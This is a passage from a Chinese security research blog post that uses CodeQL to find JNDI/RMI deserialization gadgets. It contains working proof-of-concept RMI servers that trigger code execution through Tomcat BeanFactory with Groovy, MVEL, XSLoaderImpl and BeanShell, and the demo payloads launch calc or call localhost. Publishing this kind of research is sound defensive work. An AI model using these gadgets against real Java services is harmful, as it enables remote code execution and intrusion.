punctuation">(</span><span class="token string">"groovy.lang.GroovyShell"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"m1yuu=parse"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"m1yuu"</span><span class="token punctuation">,</span><span class="token string">"@groovy.transform.ASTTest(value={\nassert java.lang.Runtime.getRuntime().exec(\"calc\")\n})\ndef m1yuu\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ReferenceWrapper</span> referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>resourceRef<span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/07/08/xE3BpaQGmdcbwsH.png" alt="image-20220705154639747"></p><p>也是实例化<code>GroovyCodeSource</code>为<code>gcs</code>后进入<code>parse</code>，调用<code>parseClass</code>后会一直调用到<code>evaluate</code>，防止文章篇幅过长就不逐栈分析了，调用栈如下：</p><p><img src="https://s2.loli.net/2022/07/08/aJG3DeojWc9rTRg.png" alt="image-20220705155257845"></p><p>最后传入<code>evaluate</code>的参数如图：</p><p><img src="https://s2.loli.net/2022/07/08/Y1m5JVu6hURxyoZ.png" alt="image-20220705155433237"></p><h4 id="RCE-parseClass"><a href="#RCE-parseClass" class="headerlink" title="RCE:parseClass"></a>RCE:parseClass</h4><p><img src="https://s2.loli.net/2022/07/08/4GeRg2O5imVhC6x.png" alt="image-20220705160144253"></p><p><code>parseClass</code>的利用方式在公开的文章中已经被提到很多次，在此就不详细介绍了。</p><h4 id="出网探测-getText"><a href="#出网探测-getText" class="headerlink" title="出网探测:getText"></a>出网探测:getText</h4><p>也是没啥意义的利用点，浅蓝师傅找的<code>addClasspath</code>本质上也能作为出网探测。找到了就记录一下</p><p>poc:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> JNDI<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">ResourceRef</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">StringRefAddr</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">AlreadyBoundException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HighRMIServer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span><span class="token punctuation">,</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">AlreadyBoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">6666</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ResourceRef</span> resourceRef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"groovy.ui.GroovyMain"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"m1yuu=getText"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"m1yuu"</span><span class="token punctuation">,</span><span class="token string">"http://127.0.0.1:8000"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ReferenceWrapper</span> referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>resourceRef<span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/07/08/1GpviCnR4ZxmzW2.png" alt="image-20220629091810108"></p><h2 id="0x03-MVEL"><a href="#0x03-MVEL" class="headerlink" title="0x03 MVEL"></a>0x03 MVEL</h2><p>我在找MVEL已经编译好的codeql数据库时不小心搜到了藏青师傅的文章：<a href="https://xz.aliyun.com/t/10829">https://xz.aliyun.com/t/10829</a></p><p>打开一看也是使用codeql分析JNDI RMI利用方式，瞬间感觉慌的一。但仔细阅读了文章之后发现该文章主要是使用codeql的污点分析功能针对MVEL利用方式进行追踪，与本文思路并不相同。</p><p>当然我们的codeql脚本也能准确定位到漏洞触发点：</p><p><img src="https://s2.loli.net/2022/07/08/lvJbFxIjHc2gnY3.png" alt="image-20220705165902768"></p><p>既然藏青师傅已经写了完整准确详细的污点分析过程，这里就不针对此利用方式过多叙述了。</p><p>在MVEL的查询结果中并没有找到其他可利用的方式，parse方法虽然可以满足条件但这里的parse方法真的只是针对字符串进行操作，并没有解析运行的行为。<img src="https://s2.loli.net/2022/07/08/eLIyjpQGHbZCrn6.png" alt="image-20220705170215525"></p><p>poc：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> JNDI<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">ResourceRef</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">StringRefAddr</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">AlreadyBoundException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HighRMIServer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span><span class="token punctuation">,</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">AlreadyBoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">7777</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"org.mvel2.sh.ShellSession"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>                <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"m1yuu=exec"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"m1yuu"</span><span class="token punctuation">,</span> <span class="token string">"push Runtime.getRuntime().exec('calc');"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ReferenceWrapper</span> referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/07/08/coNrsDFxLwHQmp9.png" alt="image-20220706144031565"></p><p><img src="https://s2.loli.net/2022/07/08/O6RXGr3JeLQxNF2.png" alt="image-20220706144138745"></p><h2 id="0x04-bsh"><a href="#0x04-bsh" class="headerlink" title="0x04 bsh"></a>0x04 bsh</h2><p>其实想查询常用的包或者库，只要在spring-framework中进行查询即可。里面包含了各种常见的第三方组件（只是查出来的结果巨多也就四千来个）。去掉各种setter，可利用的点特征也很明显。</p><p>我在查询结果中找到了bsh中的可利用方式：</p><p><img src="https://s2.loli.net/2022/07/08/MaI6jJZkKPx8oVi.png" alt="image-20220708160420247"></p><h3 id="RCE-eval"><a href="#RCE-eval" class="headerlink" title="RCE:eval"></a>RCE:eval</h3><p>一般结果里有eval那百分之八九十是利用点，这次也不例外。但是看了藏青师傅的文章，发现也被藏青师傅找出来了（tql</p><p>poc：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">ResourceRef</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">StringRefAddr</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">AlreadyBoundException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HighRMIServer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span><span class="token punctuation">,</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">AlreadyBoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">7777</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"com.sun.org.apache.xerces.internal.impl.xs.XSLoaderImpl"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>                <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"m1yuu=loadURI"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"m1yuu"</span><span class="token punctuation">,</span> <span class="token string">"http://127.0.0.1:8000/exp.xml"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ReferenceWrapper</span> referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/07/08/UXQAtjDTzafCi1l.png" alt="image-20220708162038711"></p><h3 id="classForName"><a href="#classForName" class="headerlink" title="classForName"></a>classForName</h3><p>这个方法名感觉有戏，进去查看：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Class</span> <span class="token function">classForName</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isClassBeingDefined</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InterpreterError</span><span class="token punctuation">(</span><span class="token string">"Attempting to load class in the process of being defined: "</span> <span class="token operator">+</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token class-name">Class</span> var2 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                var2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">plainClassForName</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> var4<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>var2 <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                var2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">loadSourceClass</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> var2<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中调用了<code>plainClassForName</code>方法，发现在这里调用了<code>Class.forName(var1)</code>，而<code>var1</code>为我们可控的参数。<code>class.forName</code>与<code>loadClass</code>不同之处在于<code>forName</code>在加载类时会自动执行<code>static</code>内的代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HighRMIServer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span><span class="token punctuation">,</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">AlreadyBoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">7777</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"bsh.BshClassManager"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>                <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"m1yuu=classForName"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"m1yuu"</span><span class="token punctuation">,</span> <span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ReferenceWrapper</span> referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/07/08/DpJACQwMhXu6onq.png" alt="image-20220708163522741"></p><p>但是这里的利用非常鸡肋，我们害得先上传包含恶意代码的class文件到java执行目录下再进行包含执行。（我的评价是啥也不是，图一乐</p><h2 id="0x05-为何spring-framwork下无spel利用点"><a href="#0x05-为何spring-framwork下无spel利用点" class="headerlink" title="0x05 为何spring-framwork下无spel利用点"></a>0x05 为何spring-framwork下无spel利用点</h2><p>陆陆续续找了很多第三方库，可利用的点基本都被找出或者没什么太大的意义。像我们熟知的<code>javax.el.ELProcessor#eval</code>中，<code>eval</code>方法定义是直接调用<code>this.getValue()</code>，进行el命令解析。我在想<code>spring</code>中的<code>spel</code>是否也有类似的操作时，发现<code>spring</code>下真的存在一个相关方法：<code>org.springframework.expression.spel.standard#parseRaw</code>，但是细看，他只是执行了<code>doParseExpression</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token class-name">SpelExpression</span> <span class="token function">doParseExpression</span><span class="token punctuation">(</span><span class="token class-name">String</span> expressionString<span class="token punctuation">,</span> <span class="token annotation punctuation">@Nullable</span> <span class="token class-name">ParserContext</span> context<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ParseException</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>expressionString <span class="token operator">=</span> expressionString<span class="token punctuation">;</span>            <span class="token class-name">Tokenizer</span> tokenizer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Tokenizer</span><span class="token punctuation">(</span>expressionString<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>tokenStream <span class="token operator">=</span> tokenizer<span class="token punctuation">.</span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>tokenStreamLength <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>tokenStream<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>tokenStreamPointer <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>constructedNodes<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">SpelNodeImpl</span> ast <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">eatExpression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Assert</span><span class="token punctuation">.</span><span class="token function">state</span><span class="token punctuation">(</span>ast <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"No node"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Token</span> t <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">peekToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SpelParseException</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>startPos<span class="token punctuation">,</span> <span class="token class-name">SpelMessage</span><span class="token punctuation">.</span>MORE_INPUT<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">nextToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token class-name">Assert</span><span class="token punctuation">.</span><span class="token function">isTrue</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>constructedNodes<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"At least one node expected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpression</span><span class="token punctuation">(</span>expressionString<span class="token punctuation">,</span> ast<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>configuration<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InternalParseException</span> var6<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> var6<span class="token punctuation">.</span><span class="token function">getCause</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的<code>expressionString</code>是我们可控的参数，如果正常执行的话最后会<code>return new SpelExpression(expressionString, ast, this.configuration);</code>。</p><p>正常的spel注入演示：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token 